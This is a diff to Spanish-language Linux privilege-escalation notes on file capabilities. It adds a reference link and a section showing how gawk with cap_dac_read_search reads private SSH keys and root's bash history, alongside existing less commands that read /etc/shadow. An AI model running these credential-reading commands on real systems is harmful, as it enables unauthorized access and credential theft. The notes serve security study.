@@ -39,6 +39,7 @@ Es importante señalar que los permisos permitidos pueden ser limitados aún má
 # Capabilities 
 
 * [Gtfobins](https://gtfobins.github.io/#+capabilities)
+* [Capabilities](https://juggernaut-sec.com/capabilities/)
 
 
 ```bash 
@@ -83,4 +84,13 @@ Esta capabilitie nos permite leer cualquier archivo
 ❯ /usr/bin/less /etc/shadow 
 ❯ /usr/bin/less /root/.ssh/id_rsa 
 ❯ /usr/bin/less /root/.bash_history
+```
+
+### Gawk
+```bash 
+Esta capabilitie nos permite leer cualquier archivo 
+/usr/bin/gawk cap_dac_read_search=ep 
+
+❯ gawk '//' /home/user1/.ssh/id_rsa
+❯ gawk '//' /root/.bash_history
 ```
